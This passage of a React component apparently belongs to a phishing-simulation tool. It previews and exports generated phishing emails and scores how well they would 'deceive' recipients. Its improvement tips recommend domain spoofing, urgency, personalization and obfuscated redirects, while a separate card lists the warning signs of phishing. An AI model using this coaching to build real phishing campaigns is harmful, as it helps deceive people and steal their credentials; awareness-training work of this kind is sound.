                        </Tooltip>
                      </TooltipProvider>

                      <Dialog open={showSourceCode} onOpenChange={setShowSourceCode}>
                        <DialogTrigger asChild>
                          <Button variant="outline" size="icon">
                            <Code className="h-4 w-4" />
                          </Button>
                        </DialogTrigger>
                        <DialogContent className="max-w-4xl h-[80vh]">
                          <DialogHeader>
                            <DialogTitle className="flex items-center justify-between">
                              <span>HTML Source Code</span>
                              <div className="flex items-center space-x-2">
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={handleCopyHtml}
                                  className={copySuccess ? "bg-green-100" : ""}
                                >
                                  {copySuccess ? "Copied!" : "Copy HTML"}
                                </Button>
                                <Button variant="outline" size="sm" onClick={handleDownloadHtml}>
                                  <Download className="h-4 w-4 mr-2" />
                                  Download HTML
                                </Button>
                              </div>
                            </DialogTitle>
                            <DialogDescription>HTML source code for the {phishingTemplate} template</DialogDescription>
                          </DialogHeader>
                          <ScrollArea className="h-[calc(80vh-120px)]">
                            <pre className="whitespace-pre-wrap text-xs bg-gray-50 p-4 rounded border overflow-auto">
                              {emailHtmlSource}
                            </pre>
                          </ScrollArea>
                        </DialogContent>
                      </Dialog>

                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button variant="outline" size="icon" onClick={handleDownloadHtml}>
                              <Download className="h-4 w-4" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>
                            <p>Download HTML</p>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                    </div>
                  </CardTitle>
                  <CardDescription>How the email will appear to recipients</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="border rounded-md overflow-hidden">
                    {emailPreview || (
                      <div className="p-8 text-center text-muted-foreground">
                        <Mail className="mx-auto h-8 w-8 mb-2 opacity-50" />
                        <p>Select a template to preview</p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Phishing Effectiveness Score</CardTitle>
                  <CardDescription>
                    Real-time analysis of your phishing campaign's potential effectiveness
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-sm font-medium">Effectiveness Score: {phishingScore}%</span>
                      <Badge
                        variant={
                          phishingLevel === "Very High"
                            ? "destructive"
                            : phishingLevel === "High"
                              ? "destructive"
                              : phishingLevel === "Medium"
                                ? "default"
                                : "outline"
                        }
                      >
                        {phishingLevel} Level
                      </Badge>
                    </div>
                    <Progress value={phishingScore} className="h-2" />
                  </div>

                  <div className="space-y-2">
                    <h4 className="text-sm font-semibold">Effectiveness Analysis</h4>
                    <div className="text-sm space-y-2">
                      <div className="flex items-start">
                        <div className="mr-2 mt-0.5">
                          {phishingScore >= 70 ? (
                            <AlertTriangle className="h-4 w-4 text-red-500" />
                          ) : phishingScore >= 50 ? (
                            <AlertCircle className="h-4 w-4 text-amber-500" />
                          ) : (
                            <AlertCircle className="h-4 w-4 text-blue-500" />
                          )}
                        </div>
                        <p className="text-sm">
                          {phishingScore >= 85
                            ? "This phishing campaign is extremely sophisticated and would likely deceive even security-aware users."
                            : phishingScore >= 70
                              ? "This phishing campaign is highly effective and would likely deceive many users."
                              : phishingScore >= 50
                                ? "This phishing campaign has moderate effectiveness and might deceive average users."
                                : phishingScore >= 30
                                  ? "This phishing campaign has low effectiveness and would likely only deceive inexperienced users."
                                  : "This phishing campaign has very low effectiveness and would be easily identified as suspicious."}
                        </p>
                      </div>
                    </div>
                  </div>

                  <Separator />

                  <div className="space-y-2">
                    <h4 className="text-sm font-semibold">Improvement Tips</h4>
                    <div className="space-y-2 text-sm">
                      {phishingScore < 100 && (
                        <ul className="space-y-1 list-disc pl-5">
                          {!useUrgencyTactics && <li>Add urgency tactics to create time pressure</li>}
                          {!useSocialProofing && <li>Include social proof elements to increase credibility</li>}
                          {!usePersonalization && <li>Add personalization to make the email appear more legitimate</li>}
                          {!domainSpoofing && <li>Implement domain spoofing to better mimic legitimate sources</li>}
                          {redirectMethod === "direct" && (
                            <li>Use more sophisticated redirect methods to hide malicious URLs</li>
                          )}
                          {sophisticationLevel < 8 && (
                            <li>Increase the sophistication level for more convincing content</li>
                          )}
                          {!includeAttachment && phishingTemplate === "invoice" && (
                            <li>Include an attachment for this template type</li>
                          )}
                          {!includeLogo && <li>Add an organization logo to increase legitimacy</li>}
                          {phishingType !== "financial" && (
                            <li>Financial-themed phishing tends to have higher success rates</li>
                          )}
                        </ul>
                      )}
                      {phishingScore >= 100 && (
                        <p className="text-green-600">
                          This phishing campaign is already optimized for maximum effectiveness. For educational
                          purposes, consider demonstrating how removing certain elements would reduce its effectiveness.
                        </p>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>

              {generatedEmail && (
                <Card>
                  <CardHeader>
                    <CardTitle>Generated Email Template</CardTitle>
                    <CardDescription>Raw email content for educational analysis</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <pre className="whitespace-pre-wrap text-xs bg-gray-50 p-3 rounded border overflow-auto max-h-[300px]">
                      {generatedEmail}
                    </pre>
                  </CardContent>
                </Card>
              )}

              <Card>
                <CardHeader>
                  <CardTitle>Security Analysis</CardTitle>
                  <CardDescription>Indicators that could help identify this as phishing</CardDescription>
                </CardHeader>
                <CardContent>
                  <ul className="space-y-2 text-sm">
                    <li className="flex items-start">
                      <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                      <span>Sender domain doesn't match the organization's legitimate domain</span>
                    </li>
                    {useUrgencyTactics && (
                      <li className="flex items-start">
                        <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                        <span>Urgency tactics creating pressure to act quickly</span>
                      </li>
                    )}
                    <li className="flex items-start">
                      <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                      <span>Hovering over links would reveal suspicious URLs</span>
                    </li>
                    <li className="flex items-start">
                      <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                      <span>Request for sensitive information via email</span>
                    </li>
                    {trackingPixel && (
                      <li className="flex items-start">
                        <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                        <span>Contains tracking pixels to monitor email opens</span>
                      </li>
                    )}
                    {domainSpoofing && (
                      <li className="flex items-start">
                        <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                        <span>Uses a domain that mimics a legitimate organization</span>
                      </li>
                    )}
                    {redirectMethod === "obfuscated" && (
                      <li className="flex items-start">
                        <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                        <span>Uses obfuscated URLs to hide the true destination</span>
                      </li>
                    )}
                    {includeAttachment && (
                      <li className="flex items-start">
                        <AlertCircle className="h-4 w-4 mr-2 text-red-500 mt-0.5" />
                        <span>Contains attachments that could be malicious</span>
                      </li>
                    )}
                  </ul>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>

      {result && (
        <Alert variant={result.success ? "default" : "destructive"}>
          <AlertCircle className="h-4 w-4" />
          <AlertTitle>{result.success ? "Success" : "Error"}</AlertTitle>
          <AlertDescription>{result.message}</AlertDescription>
        </Alert>
      )}
    </div>
  )
}

